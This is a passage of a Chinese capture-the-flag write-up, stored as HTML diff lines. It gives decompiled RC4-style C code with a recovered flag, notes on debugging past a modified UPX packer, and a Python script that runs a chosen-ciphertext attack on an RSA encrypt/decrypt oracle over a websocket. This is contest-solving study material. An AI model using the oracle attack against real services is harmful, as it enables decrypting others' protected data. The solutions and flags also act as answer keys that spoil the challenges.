+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v8</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">%</span> <span class="n">a3</span> <span class="o">+</span> <span class="n">a2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="p">(</span><span class="n">v8</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">+</span> <span class="n">v6</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">j</span> <span class="o">+</span> <span class="n">a1</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">j</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">j</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="n">v6</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">crypt1</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+27h] [rbp-11h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">a3</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="p">(</span><span class="n">v6</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="n">v6</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">a2</span><span class="p">)</span> <span class="o">^=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">a1</span><span class="p">))</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">crypt2</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+27h] [rbp-11h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+2Ch] [rbp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">a3</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="p">(</span><span class="n">v6</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="n">v6</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="n">a2</span><span class="p">)</span> <span class="o">+=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v5</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="n">a1</span><span class="p">))</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">key1</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;keykey&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;ban_debug!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">key1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">init</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">key1</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">length2</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">crypt1</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">length2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// seconds
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">init</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">v0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">flag</span><span class="p">[]</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">        <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">        <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">        <span class="mh">0xCF</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">crypt2</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">flag</span><span class="p">,</span><span class="n">v2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//flag{1237-12938-9372-1923-4u92}
+</span></span></span></code></pre></div><h3 id="re-2" class="heading-element">
+  <a href="#re-2" class="heading-mark"></a>3.2 re-2</h3><p><code>upx</code> 的壳，但魔改过了，直接用 <code>dbg</code> 动调就可以，在执行完加密函数后下断点，记得输入的 <code>flag</code> 长度要为 <code>27</code>，才能进入到加密函数中，他的加密函数是直接解密了 <code>flag</code>
+所以通过调试可以直接得到 <code>flag</code>
+<img loading="lazy" src="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-4.png" alt="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-4.png" srcset="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-4.png?size=small, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-4.png?size=medium 1.5x, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-4.png?size=large 2x" data-title="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-4.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<img loading="lazy" src="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-5.png" alt="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-5.png" srcset="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-5.png?size=small, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-5.png?size=medium 1.5x, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-5.png?size=large 2x" data-title="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-5.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="crypto" class="heading-element">
+  <a href="#crypto" class="heading-mark"></a>4 Crypto</h2><h3 id="crypto-1" class="heading-element">
+  <a href="#crypto-1" class="heading-mark"></a>4.1 crypto-1</h3><div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">websocket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag</span><span class="p">(</span><span class="n">websocket</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">websocket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;cmd&#34;</span><span class="p">:</span> <span class="s2">&#34;get_flag&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">result</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="ow">or</span> <span class="s2">&#34;Pls send msgs and I&#39;ll return the result&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">websocket</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">f</span><span class="p">(</span><span class="n">websocket</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">websocket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;cmd&#34;</span><span class="p">:</span> <span class="n">cmd</span><span class="p">,</span> <span class="s2">&#34;data&#34;</span><span class="p">:</span> <span class="n">data</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">512</span><span class="p">)}))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">result</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="ow">or</span> <span class="s2">&#34;Pls send msgs and I&#39;ll return the result&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">websocket</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">uri</span> <span class="o">=</span> <span class="s2">&#34;ws://xxx&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">get_flag</span><span class="p">(</span><span class="n">ws</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">c2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="s2">&#34;enc&#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">c3</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="s2">&#34;enc&#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="mi">3</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">c4</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="s2">&#34;enc&#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="mi">4</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">c9</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="s2">&#34;enc&#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="mi">9</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="n">GCD</span><span class="p">(</span><span class="n">c2</span><span class="o">**</span><span class="mi">2</span> <span class="o">-</span> <span class="n">c4</span><span class="p">,</span> <span class="n">c3</span><span class="o">**</span><span class="mi">2</span> <span class="o">-</span> <span class="n">c9</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">enc_flag_2</span> <span class="o">=</span> <span class="n">c2</span> <span class="o">*</span> <span class="n">c</span> <span class="o">%</span> <span class="n">n</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag_2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">ws</span><span class="p">,</span> <span class="s2">&#34;dec&#34;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">enc_flag_2</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">flag_2</span> <span class="o">//</span> <span class="mi">2</span><span class="p">))</span></span></span></code></pre></div><h3 id="crypto-2" class="heading-element">
+  <a href="#crypto-2" class="heading-mark"></a>4.2 crypto-2</h3><p>使用他的客户端程序
+分别输入 <code>uid=admin</code> ，<code>seed=任意值</code> ，然后会打开一个 <code>python</code> 的客户端，这个时候输入的 <code>seed</code> 要和前面的 <code>seed</code> 一致</p>
